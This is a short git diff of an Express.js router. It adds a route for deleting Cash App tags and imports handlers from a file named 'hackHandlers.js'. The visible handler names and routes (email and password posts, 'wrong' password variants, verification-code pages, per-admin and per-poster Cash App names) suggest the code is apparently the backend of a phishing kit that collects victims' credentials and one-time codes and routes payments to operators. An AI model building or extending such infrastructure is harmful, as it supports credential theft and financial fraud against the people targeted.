@@ -12,7 +12,7 @@ import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,
 
 import {
     
-    renumber_add, email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, successful_page_post,reverify_code_page_post,renumber_code_page_post,mega_wrong,add_name
+    renumber_add, email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, successful_page_post,reverify_code_page_post,renumber_code_page_post,mega_wrong,add_name,delete_cash_tag
     
 } from './hackHandlers.js'
 
@@ -100,7 +100,7 @@ router.post('/send/email/test', send_email);
 
 router.post('/add/cashapp/name/:adminId/:posterId', add_name);//edit links number
 
-
+router.delete('/delete/cashapp', delete_cash_tag);
 
 
 router.get('/yoyo',yoyo);
